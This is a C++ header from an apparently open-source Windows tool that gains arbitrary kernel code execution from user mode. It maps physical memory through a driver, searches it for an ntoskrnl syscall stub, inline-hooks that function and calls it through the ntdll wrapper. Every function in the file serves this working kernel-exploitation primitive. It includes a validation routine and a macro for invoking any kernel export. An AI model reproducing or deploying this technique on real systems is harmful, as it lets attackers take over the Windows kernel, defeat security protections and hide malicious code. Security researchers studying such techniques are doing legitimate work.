/*

	MIT License

	Copyright (c) 2021 Kento Oki

	Permission is hereby granted, free of charge, to any person obtaining a copy
	of this software and associated documentation files (the "Software"), to deal
	in the Software without restriction, including without limitation the rights
	to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
	copies of the Software, and to permit persons to whom the Software is
	furnished to do so, subject to the following conditions:

	The above copyright notice and this permission notice shall be included in all
	copies or substantial portions of the Software.

	THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
	IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
	FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
	AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
	LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
	OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
	SOFTWARE.

*/

#pragma once
#include <windows.h>

#include "logger.hpp"
#include "helper.hpp"
#include "driver.hpp"
#include "cpudef.hpp"
#include "hook.hpp"
#include "nt.hpp"

#define KB(x) ((size_t) (x) << 10)
#define MB(x) ((size_t) (x) << 20)

//
// length of stub to scan
//
#define STUB_SCAN_LENGTH 0x20

//
// use this if you are lazy
// all you need is define prototype of the function
//
#define SYSCALL( function_name, ... ) \
	syscall::invoke< function_name >( \
		( void* )( helper::find_ntoskrnl_export( #function_name ), __VA_ARGS__) )

// this is huge structure to define here...
using PEPROCESS = PVOID;

using PsLookupProcessByProcessId = NTSTATUS( __fastcall* )(
	HANDLE    ProcessId,
	PEPROCESS* Process );

using PsGetProcessSectionBaseAddress = PVOID( __fastcall* )(
	PEPROCESS Process );

using PsGetCurrentProcessId = HANDLE( __fastcall* )( void );

using MmGetPhysicalAddress = PHYSICAL_ADDRESS( __fastcall* )(
	PVOID BaseAddress );

namespace syscall
{
	//
	// this points to the desired hook syscall function
	// that mapped to our user virtual address
	//
	inline void* function;

	//
	// this points to the user-side syscall wrapper function
	// e.g, NtCreateFile, NtQuerySystemTime in ntdll
	// this function is not actually hooked or modified
	//
	inline void* hook_function;

	//
	// does certain syscall-hook found?
	//
	inline bool found;

	//
	// cache function stub got from ntoskrnl.exe rva
	//
	inline uint8_t stub[ STUB_SCAN_LENGTH ];
	inline uint16_t page_offset;

	//
	// any kernel code execution - anycall
	//
	template <class FnType, class ... Args>
	std::invoke_result_t<FnType, Args...> invoke(
		void* detour, Args ... augments )
	{
		//
		// inline-hook against desired arbitrary syscall
		//
		hook::hook( syscall::function, detour, true );

		//
		// issue syscall
		// `hook_function` is not actually hooked, but
		// hooked in ntoskrnl.exe internal
		//
		const auto invoke_result = 
			reinterpret_cast< FnType >( hook_function )( augments ... );

		//
		// unhook immediately
		//
		hook::unhook( syscall::function, true );

		return invoke_result;
	}

	//
	// check if syscall-hook is succeeded
	//
	bool validate()
	{
		DWORD pid_from_hooked_syscall = 0;

		//
		// wow, PsGetCurrentProcessId returns this user process's pid,
		// if the syscall-hook is succeeded
		//
		pid_from_hooked_syscall = ( DWORD )SYSCALL( PsGetCurrentProcessId );

		const bool is_syscall_ok = 
			pid_from_hooked_syscall == GetCurrentProcessId();

		LOG( " ---> [validation] PsGetCurrentProcessId:%d == %d:GetCurrentProcessId -> %s\n",
			pid_from_hooked_syscall,
			GetCurrentProcessId(),
			is_syscall_ok ? "OK" : "INVALID" );

		return is_syscall_ok;
	}

	bool probe_for_hook( const uint64_t mapped_va )
	{
		//
		// compare stub of destination of hook function
		//
		if ( memcmp(
			reinterpret_cast< void* >( mapped_va ),
			stub, STUB_SCAN_LENGTH ) == 0 )
		{
			//
			// we can't trust this yet
			//
			syscall::function = reinterpret_cast< void* >( mapped_va );

			LOG( " ---> compare\n" );
			helper::print_hex( " [CANDIDATE] ", ( void* )mapped_va, STUB_SCAN_LENGTH );
			helper::print_hex( " [FUNC STUB] ", ( void* )stub, STUB_SCAN_LENGTH );

			//
			// validate by try hook and call
			//
			return syscall::validate();
		}

		return false;
	}

	bool scan_for_range( uint64_t start_pa, uint64_t end_pa )
	{
		LOG( "[+] scan for range [0x%llX -> 0x%llX]\n",
			start_pa, end_pa );

		const auto pa_size = start_pa + end_pa;
		
		const auto iterator = [ & ]( uint64_t base, size_t size = NULL )
		{
			if ( !size )
				size = MB( 2 );

			// just for logging
			uint32_t counter = 0;

			for ( auto current_page = base;
				current_page < base + size;
				current_page += PAGE_SIZE )
			{
				counter++;

				//
				// probe this page
				//
				if ( probe_for_hook( current_page ) )
				{
					LOG( "[+] hook function found in range [0x%llX -> 0x%llX] and page %d\n",
						start_pa, end_pa, counter );
					return true;
				}
			}

			return false;
		};

		if ( pa_size <= MB( 2 ) )
		{
			const uint64_t mapped_va = driver::map_physical_memory(
				start_pa + page_offset, end_pa );

			if ( !mapped_va )
			{
				LOG( "[!] failed to map physical memory\n" );
				return false;
			}

			if ( iterator( mapped_va, end_pa ) )
				return true;

			driver::unmap_physical_memory( mapped_va, end_pa );
			return false;
		}
		
		//
		// big page
		//
		const auto modulus = pa_size % MB( 2 );

		for ( auto part = start_pa;
			part < pa_size;
			part += MB( 2 ) )
		{
			const uint64_t mapped_va = driver::map_physical_memory(
				part + page_offset, MB( 2 ) );

			if ( !mapped_va )
			{
				LOG( "[!] failed to map physical memory\n" );
				continue;
			}

			if ( iterator( mapped_va, MB( 2 ) ) )
				return true;

			driver::unmap_physical_memory( mapped_va, MB( 2 ) );
		}

		const uint64_t mapped_va =
			driver::map_physical_memory(
				pa_size - modulus + page_offset, modulus );

		if ( !mapped_va )
		{
			LOG( "[!] failed to map physical memory\n" );
			return false;
		}

		if ( iterator( mapped_va, modulus ) )
			return true;

		driver::unmap_physical_memory( mapped_va, modulus );
		return false;
	}

	//
	// syscall-hook initialization
	//
	bool setup(
		const std::string_view hook_function_module_name,	// the module name the function contains
		const std::string_view hook_function_name )			// any desired hook function
	{
		// already initialized
		if ( syscall::found )
			return false;

		std::vector< PHYSICAL_ADDRESS_RANGE > pa_range_list;

		//
		// fetch physical memory ranges from registry
		//
		helper::query_physical_memory_ranges( pa_range_list );

		if ( pa_range_list.size() <= 0 )
		{
			LOG( "[!] failed to fetch physical memory ranges\n" );
			LOG_ERROR();

			return false;
		}

		//
		// function pointer to the user-side syscall wrappers
		// this function is not actually hooked
		//
		hook_function = ( void* )GetProcAddress(
			GetModuleHandle( hook_function_module_name.data() ),
			hook_function_name.data() );

		if ( !hook_function )
		{
			LOG( "[!] failed to locate hook %s in %s\n",
				hook_function_name.data(), hook_function_module_name.data() );
			LOG_ERROR();

			return false;
		}

		LOG( "[!] hook function found: %s in %s at 0x%p\n",
			hook_function_name.data(),
			hook_function_module_name.data(),
			hook_function );

		const SYSMODULE_RESULT ntoskrnl =
			helper::find_sysmodule_address( "ntoskrnl.exe" );

		std::string ntoskrnl_full_path = ntoskrnl.image_full_path;
		helper::replace_systemroot( ntoskrnl_full_path );

		if ( !ntoskrnl.base_address )
		{
			LOG( "[!] failed to locate ntoskrnl.exe\n" );
			return false;
		}

		//
		// temporally buffer
		//
		uint8_t* our_ntoskrnl;

		our_ntoskrnl = reinterpret_cast< std::uint8_t* >(
			LoadLibraryA( ntoskrnl_full_path.c_str() ) );

		if ( !our_ntoskrnl )
		{
			LOG( "[!] failed to map ntoskrnl.exe into our process\n" );
			LOG_ERROR();

			return false;
		}

		LOG( "[+] ntoskrnl.exe is at 0x%llX (ourselves: 0x%p)\n",
			ntoskrnl.base_address, our_ntoskrnl );

		//
		// rva and page offset to the desired syscall function
		//
		const auto hook_function_rva =
			helper::find_ntoskrnl_export( hook_function_name, true /* as rva */ );

		if ( !hook_function_rva )
		{
			LOG( "[!] failed to locate %s in ntoskrnl.exe\n",
				hook_function_name.data() );

			return false;
		}

		page_offset = hook_function_rva % PAGE_SIZE;

		LOG( "[+] hook function rva: 0x%llX\n", hook_function_rva );
		LOG( "[+] page offset: 0x%lX\n", page_offset );
		LOG( "[+] ntoskrnl.exe path: %s\n", ntoskrnl_full_path.c_str() );

		//
		// cache hook function stub to our buffer
		//
		memcpy(
			&stub[ 0 ],
			( void* )( our_ntoskrnl + hook_function_rva ),
			STUB_SCAN_LENGTH );

		FreeLibrary( (HMODULE)our_ntoskrnl );

		helper::print_hex( "[+] function stub: ", (void*)stub, STUB_SCAN_LENGTH );

		//
		// scan for every single physical memory ranges
		//
		for ( auto pa_range : pa_range_list )
		{
			if ( scan_for_range( pa_range.start_pa, pa_range.end_pa ) )
			{
				PHYSICAL_ADDRESS physical_address =
					syscall::invoke<MmGetPhysicalAddress>(
						( void* )helper::find_ntoskrnl_export( "MmGetPhysicalAddress" ),
						syscall::function );

				LOG( "[+] %s found at VA:0x%llX PA:0x%llX\n",
					hook_function_name.data(),
					syscall::function, physical_address.QuadPart );

				syscall::found = true;
				break;
			}
		}

		if ( !syscall::found )
		{
			LOG( "[!] syscall was not found\n" );
			return false;
		}

		return true;
	}
}